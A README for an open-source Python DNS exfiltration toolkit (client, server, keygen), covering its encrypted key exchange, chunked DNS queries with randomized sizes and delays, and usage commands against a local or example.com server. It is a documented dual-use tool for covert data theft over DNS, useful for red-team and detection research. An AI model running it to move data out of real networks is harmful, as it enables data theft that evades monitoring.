# DNS Exfiltration Client & Server (v4.0)

This toolkit demonstrates secure DNS-based file exfiltration using modern cryptography:

- **True Perfect Forward Secrecy** — both sides generate ephemeral X25519 keypairs per session; no key material is ever persisted to disk
- **Optional Mutual Authentication** — Ed25519 identity keys allow both sides to verify each other during key exchange (MITM protection)
- **Authenticated encryption** using AES-GCM for confidentiality and integrity
- **Structured wire format** — versioned, length-prefixed fields for forward-compatible key exchange
- **Base32** payload encoding for DNS-safe transfers
- **Chunked UDP DNS queries** for transport
- **SessionManager** with per-session and per-IP rate limiting, duplicate chunk rejection, and configurable TTL

---

## What's New in v4.0

v4.0 is a breaking change from v3.x — both client and server must be updated together.

### Breaking Changes
- **Wire format**: Key exchange uses a structured format (`version || num_fields || [len || data]...`) instead of raw byte concatenation. v3.x clients/servers are incompatible.
- **No HMAC layer**: The redundant HMAC-SHA256 layer over AES-GCM has been removed. AES-GCM already provides authenticated encryption.
- **Context-bound HKDF**: Key derivation now binds to `session_id + both_pubkeys` in the HKDF info parameter, preventing cross-session key reuse.

### New Features
- **`crypto_utils.py`** — shared crypto module eliminates code duplication across client/server/keygen
- **`SessionManager` class** — replaces module-level global dicts with encapsulated, thread-safe session state
- **`--require-auth`** — server can reject unauthenticated clients (responds with 0-field rejection payload)
- **`--session-ttl`** / **`--cleanup-interval`** — configurable session lifetime
- **`--rate-limit-max-session`** — per-session rate limiting in addition to per-IP
- **Duplicate chunk rejection** — replay protection for data fragments
- **`--json-log`** — structured JSON log output for both client and server
- **Socket reuse** — client uses a single UDP socket for the entire session
- **4096-byte receive buffer** — increased from 512 for larger responses

---

## Components

### crypto_utils.py

Shared cryptographic utilities:
- Key I/O: `load_signing_key`, `load_identity_pubkey`, `compute_fingerprint`
- Base32: `base32_encode`, `base32_decode`
- HKDF: `derive_shared_keys` (context-bound to session + pubkeys)
- AES-GCM: `encrypt_file`, `decrypt_blob`
- Wire format: `encode_kex_payload`, `decode_kex_payload`
- Logging: `JSONFormatter`, `configure_logging`

### keygen.py

- Generates an Ed25519 identity keypair for mutual authentication
- Writes raw 32-byte files: `<name>_ed25519` (private seed, chmod 600) and `<name>_ed25519.pub` (public key)
- Prints the SHA-256 fingerprint (first 8 bytes, hex-encoded)

### client.py

- Generates an ephemeral X25519 keypair per transfer
- Sends client public key as a **TXT query** using structured wire format
- If `--signing-key` is provided: signs the ephemeral pubkey with Ed25519 and includes signature + fingerprint as additional fields
- Receives the server's ephemeral public key in the **TXT response**
- If `--server-identity-pubkey` is provided: verifies the server's Ed25519 signature
- Detects rejection responses (0 fields) from `--require-auth` servers
- Derives a per-transfer AES key via context-bound HKDF
- Encrypts file with AES-GCM (12 B nonce), Base32-encodes
- Splits into randomized-size subdomains, sends as DNS A queries
- Uses a single reusable UDP socket with 4096-byte buffer

### server.py

- `SessionManager` class manages all session state with two locks (session state + rate limiting)
- On TXT queries: parses structured wire format, handles 1-field (unauth) or 3-field (auth) payloads
- `--require-auth`: rejects unauthenticated clients with 0-field response
- Duplicate fragment rejection (replay protection)
- Per-IP and per-session rate limiting
- Configurable session TTL and cleanup interval
- On complete reassembly: Base32-decodes, decrypts AES-GCM, writes output

---

## Installation

```bash
git clone https://github.com/bufo333/python-dns-exfiltration-client-server.git
cd python-dns-exfiltration-client-server
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

---

## Quick Start

### 1. Unauthenticated Mode

**Start the server:**

```bash
python server.py \
  --port 5300 \
  --domain xf.example.com \
  --output-dir output
```

**Run the client:**

```bash
python client.py \
  --server-ip   127.0.0.1 \
  --server-port 5300 \
  --domain      xf.example.com \
  --file-path   secret.txt
```

### 2. Authenticated Mode (mutual Ed25519 verification)

#### Step 1: Generate identity keypairs

```bash
python keygen.py --name server  --output-dir keys/
python keygen.py --name client1 --output-dir keys/
```

#### Step 2: Distribute public keys out-of-band

```bash
mkdir -p trusted_clients/
cp keys/client1_ed25519.pub trusted_clients/
```

Identity public keys are **never sent over the wire** — they must be pre-shared via a trusted channel.

#### Step 3: Start the server with authentication

```bash
python server.py \
  --port 5300 \
  --domain xf.example.com \
  --output-dir output \
  --signing-key keys/server_ed25519 \
  --trusted-clients-dir trusted_clients/
```

#### Step 4: Run the client with authentication

```bash
python client.py \
  --server-ip   127.0.0.1 \
  --server-port 5300 \
  --domain      xf.example.com \
  --file-path   secret.txt \
  --signing-key keys/client1_ed25519 \
  --server-identity-pubkey keys/server_ed25519.pub
```

### 3. Require-Auth Mode

Reject all unauthenticated clients:

```bash
python server.py \
  --port 5300 \
  --domain xf.example.com \
  --output-dir output \
  --signing-key keys/server_ed25519 \
  --trusted-clients-dir trusted_clients/ \
  --require-auth
```

An unauthenticated client will receive a rejection response and log an error.

### 4. JSON Logging

```bash
python server.py --port 5300 --domain xf.example.com --output-dir output --json-log
python client.py --server-ip 127.0.0.1 --server-port 5300 --domain xf.example.com --file-path secret.txt --json-log
```

---

## Protocol

### Wire Format (v4)

Key exchange payloads use a structured binary format:

```
version(1 byte) || num_fields(1 byte) || [field_length(2 bytes, big-endian) || field_data]...
```

| Direction | Unauthenticated | Authenticated | Rejection |
|-----------|----------------|---------------|-----------|
| Client → Server | 1 field: [pubkey(32B)] | 3 fields: [pubkey(32B), sig(64B), fingerprint(8B)] | N/A |
| Server → Client | 1 field: [pubkey(32B)] | 2 fields: [pubkey(32B), sig(64B)] | 0 fields |

### Flow

1. Client generates session ID + ephemeral X25519 keypair
2. Client encodes pubkey (+ optional auth fields) in structured wire format
3. Client sends **TXT query**: `<id>-0-0-<b32_payload>.<domain>`
4. Server parses structured payload, generates ephemeral keypair
5. Server derives AES key via ECDH + context-bound HKDF
6. Server responds with **TXT record**: Base32-encoded structured response
7. Client parses response, derives same AES key
8. Client encrypts file (AES-GCM), Base32-encodes, sends chunks as **A queries**
9. Server reassembles (with duplicate rejection), decrypts, writes output

---

## CLI Reference

### keygen.py

```text
usage: keygen.py [-h] --name NAME [--output-dir DIR]

options:
  --name NAME           Key name prefix (e.g. "server", "client1")
  --output-dir DIR      Directory to write key files (default: .)
```

### server.py

```text
usage: server.py [-h] [--port PORT] [--output-dir DIR] [--domain DOMAIN]
                 [--rate-limit-window SECONDS] [--rate-limit-max COUNT]
                 [--rate-limit-max-session COUNT]
                 [--signing-key PATH] [--trusted-clients-dir DIR]
                 [--require-auth] [--session-ttl SECONDS]
                 [--cleanup-interval SECONDS] [--json-log]

options:
  --port PORT                     UDP listen port (default: 5300)
  --output-dir DIR                Directory for decrypted output files (default: output)
  --domain DOMAIN                 Base domain for DNS queries (default: xf.example.com)
  --rate-limit-window SECONDS     Rate limit window in seconds (default: 60)
  --rate-limit-max COUNT          Max requests per IP per window (default: 200)
  --rate-limit-max-session COUNT  Max requests per session per window (default: 100)
  --signing-key PATH              Path to server Ed25519 private key for signing
  --trusted-clients-dir DIR       Directory containing trusted client .pub files
  --require-auth                  Reject unauthenticated clients
  --session-ttl SECONDS           Session TTL in seconds (default: 600)
  --cleanup-interval SECONDS      Cleanup interval in seconds (default: 60)
  --json-log                      Output logs in JSON format
```

### client.py

```text
usage: client.py [-h] [--server-ip IP] [--server-port PORT] [--domain DOMAIN]
                 [--low MS] [--high MS] --file-path FILE_PATH
                 [--signing-key PATH] [--server-identity-pubkey PATH]
                 [--json-log]

options:
  --server-ip IP                    Server IP address (default: 127.0.0.1)
  --server-port PORT                Server UDP port (default: 5300)
  --domain DOMAIN                   Base domain (default: xf.example.com)
  --low MS                          Min inter-query delay in ms (default: 500)
  --high MS                         Max inter-query delay in ms (default: 1000)
  --file-path FILE_PATH             Path to file to exfiltrate (required)
  --signing-key PATH                Path to client Ed25519 private key
  --server-identity-pubkey PATH     Path to server Ed25519 public key
  --json-log                        Output logs in JSON format
```

---

## Security Notes

- **Perfect forward secrecy**: Ephemeral X25519 keypairs on both sides per session.
- **MITM protection**: Ed25519 identity keys verify both sides during key exchange.
- **Context-bound key derivation**: HKDF info includes session ID and both ephemeral public keys.
- **Replay protection**: Duplicate fragment indices are rejected by the server.
- **Rate limiting**: Per-IP and per-session rate limiting with configurable windows.
- **Require-auth mode**: Server can reject unauthenticated clients entirely.
- **Session cleanup**: Idle sessions automatically expire (configurable TTL).

---

## License & Author

**Author:** John Burns
**Date:** 2026-02-27
**License:** GPL-3.0
